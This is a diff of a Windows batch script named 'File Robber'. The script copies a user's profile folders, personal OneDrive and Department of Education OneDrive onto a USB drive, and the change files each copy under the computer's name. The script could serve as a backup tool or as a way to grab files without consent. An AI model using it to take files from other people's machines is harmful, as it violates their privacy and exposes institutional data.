@@ -10,13 +10,13 @@ REM Get the computer name
 for /F "tokens=2 delims==." %%a in ('wmic os get csname /value') do set "computername=%%a"
 
 REM Create the folder name with computer name
-set "outputfolder=OUTPUT %computername%"
+set "outputfolder=output"
 
 echo Setting up File Robber...
 
 REM Check if the folder already exists, if not, create it
-if not exist "%scriptdir%\%outputfolder%" (
-    md "%scriptdir%\%outputfolder%"
+if not exist "%scriptdir%\%outputfolder%\%computername%" (
+    md "%scriptdir%\%outputfolder%\%computername%"
 )
 
 REM List of source folders to copy from
@@ -37,7 +37,7 @@ timeout /t 3
 REM Loop through each folder, copy files, and move them to the 'OUTPUT' folder
 for %%d in (%folders%) do (
     echo Copying %%d...
-    xcopy "%USERPROFILE%\%%d" "%scriptdir%\%outputfolder%\%%d" /E /I /Y
+    xcopy "%USERPROFILE%\%%d" "%scriptdir%\%outputfolder%\%computername%\%%d" /E /I /Y
     echo Completed copying %%d
 )
 
@@ -51,7 +51,7 @@ echo Copying Personal OneDrive to USB...
 
 REM Check if the OneDrive folder exists, then copy its contents
 if exist "%onedrivepath%" (
-    xcopy "%onedrivepath%" "%scriptdir%\%outputfolder%\OneDrive" /E /I /Y
+    xcopy "%onedrivepath%" "%scriptdir%\%outputfolder%\%computername%\OneDrive" /E /I /Y
 ) else (
     echo Personal OneDrive folder not found.
 )
@@ -60,7 +60,7 @@ echo Copying DOE OneDrive to USB...
 
 REM Check if the OneDrive folder exists, then copy its contents
 if exist "%onedrivepath% - Department of Education" (
-    xcopy "%onedrivepath% - Department of Education" "%scriptdir%\%outputfolder%\OneDrive - Department of Education" /E /I /Y
+    xcopy "%onedrivepath% - Department of Education" "%scriptdir%\%outputfolder%\%computername%\OneDrive - Department of Education" /E /I /Y
 ) else (
     echo DOE OneDrive folder not found.
 )
